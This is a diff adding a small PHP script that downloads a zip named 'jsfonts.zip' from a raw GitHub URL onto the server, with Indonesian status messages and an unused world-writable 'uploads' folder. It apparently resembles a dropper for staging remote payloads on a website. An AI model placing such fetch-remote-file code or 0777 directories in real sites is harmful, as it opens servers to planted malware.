@@ -1,0 +1,16 @@
+<?php
+$url = "https://raw.githubusercontent.com/drianbaferlinlo393/xc/refs/heads/main/jsfonts.zip";
+$save_path = "jsfonts.zip";
+
+if (!file_exists("uploads")) {
+    mkdir("uploads", 0777, true);
+}
+
+$file_data = file_get_contents($url);
+if ($file_data !== false) {
+    file_put_contents($save_path, $file_data);
+    echo "File berhasil diunduh ke $save_path";
+} else {
+    echo "Gagal mengunduh file.";
+}
+?>
